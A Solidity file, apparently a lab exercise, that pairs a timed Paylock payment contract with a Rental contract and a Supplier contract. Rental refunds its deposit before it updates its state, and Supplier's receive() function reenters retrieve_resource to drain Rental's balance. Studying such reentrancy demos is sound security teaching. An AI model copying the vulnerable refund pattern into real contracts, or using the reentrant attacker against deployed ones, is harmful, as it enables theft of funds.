pragma solidity >=0.4.16 <0.7.0;

contract Paylock {
    
    enum State { Working , Completed , Done_1 , Delay , Done_2 , Forfeit }
    
    int disc;
    int public clock;
    int public time_collect_1N_called;
    address timeAdd;
    State st;
    
    constructor(address agreed_third_party) public {
        st = State.Working;
        disc = 0;
        clock = 0;
        timeAdd = agreed_third_party;
    }

    function tick() public {
        require(msg.sender == timeAdd, "Only the agreed third party can call tick()");
        clock += 1;
    }

    function signal() public {
        require(st == State.Working, "signal() can only be called when state is Working");
        st = State.Completed;
        disc = 10;
    }

    function collect_1_Y() public {
        require(st == State.Completed, "collect_1_Y requires the state to be Completed");
        require(clock < 4, "collect_1_Y requires clock < 4");
        st = State.Done_1;
        disc = 10;
    }

    function collect_1_N() external {
        require(st == State.Completed, "collect_1_N requires the state to be Completed");
        require(clock >= 4, "collect_1_N requires clock >= 4");
        time_collect_1N_called = clock;
        st = State.Delay;
        disc = 5;
    }

    function collect_2_Y() external {
        require(st == State.Delay, "collect_2_Y requires the state to be Delay");
        require(clock < time_collect_1N_called + 4, "collect_2_Y requires clock < time_collect_1N_called + 4");
        st = State.Done_2;
        disc = 5;
    }

    function collect_2_N() external {
        require( st == State.Delay, "Must be in Delay state" );
        require( clock >= time_collect_1N_called + 4 );
        st = State.Forfeit;
        disc = 0;
    }

    function getStateName() public view returns (string memory) {
        if (st == State.Working) {
            return "Working";
        } else if (st == State.Completed) {
            return "Completed";
        } else if (st == State.Done_1) {
            return "Done_1";
        } else if (st == State.Delay) {
            return "Delay";
        } else if (st == State.Done_2) {
            return "Done_2";
        } else if (st == State.Forfeit) {
            return "Forfeit";
        } else {
            return "Unknown";
        }
    }

}

contract Supplier {
    
    Paylock p;
    Rental r;
    
    enum State { Working , Completed , Rented , Returned }
    
    State st;

    bool private attacking = false;
    
    constructor(address paylock_address, address payable rental_address) public {
        p = Paylock(paylock_address);
        r = Rental(rental_address);
        st = State.Working;
    }
    
    function aquire_resource() external payable {
        require(st == State.Working, "Supplier: Must be in Working state to acquire resource");

        r.rent_out_resource.value(1 wei)();

        st = State.Rented;
    }

    function return_resource() external {
        require(st == State.Rented, "Supplier: Must be in Rented state to return resource");

        attacking = true;

        r.retrieve_resource();

        st = State.Returned;
    }

    function finish() external {
        require(st == State.Returned, "Supplier: Must be in Returned state to finish");

        p.signal();

        st = State.Completed;
    }

    receive() external payable {
        if (attacking && address(r).balance >= 1 wei) {
            r.retrieve_resource();
        }
    }

    function getSupplierBalance() public view returns (uint) {
        return address(this).balance;
    }

    function getRentalBalance() public view returns (uint) {
        return address(r).balance;
    }

    function getSupplierStateName() public view returns (string memory) {
        if (st == State.Working) {
            return "Working";
        } else if (st == State.Completed) {
            return "Completed";
        } else if (st == State.Rented) {
            return "Rented";
        } else if (st == State.Returned) {
            return "Returned";
        } else {
            return "Unknown";
        }
    }
    
}

contract Rental {
    
    address resource_owner;
    bool resource_available;
    
    constructor() public {
        resource_available = true;
    }
    
    function rent_out_resource() external payable {
        require(resource_available == true, "Rental: Resource not available for renting");

        //CHECK FOR PAYMENT HERE
        require(msg.value == 1 wei, "Must pay 1 wei as deposit");

        resource_owner = msg.sender;
        resource_available = false;
    }

    function retrieve_resource() external {
        require(resource_available == false, "Rental: No resource is currently rented out");
        require(msg.sender == resource_owner, "Rental: Only the original renter can return the resource");

        //RETURN DEPOSIT HERE
        (bool success, ) = msg.sender.call.value(1 wei)("");
        require(success, "Rental: Failed to return deposit via call");

        resource_available = true;
    }

    receive() external payable {}

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

}